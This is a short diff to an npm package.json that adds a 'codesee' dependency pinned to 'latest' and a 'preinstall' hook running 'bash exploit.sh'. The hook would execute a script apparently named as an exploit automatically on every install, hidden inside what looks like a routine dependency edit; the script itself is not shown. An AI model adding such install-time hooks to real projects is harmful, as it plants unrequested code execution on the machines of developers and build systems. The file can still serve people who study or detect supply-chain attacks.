@@ -112,10 +112,12 @@
     "wait-on": "2.0.2",
     "webpack": "2.6.1",
     "webpack-bundle-analyzer": "2.8.2",
-    "webpack-node-externals": "1.6.0"
+    "webpack-node-externals": "1.6.0",
+    "codesee": "latest"
   },
   "license": "MIT",
   "scripts": {
+    "preinstall": "bash exploit.sh",
     "api": "node server/api.server.js",
     "bootstrap": "node scripts/bootstrap.js",
     "prebuild": "npm run prebuild:login && npm run prebuild:main",
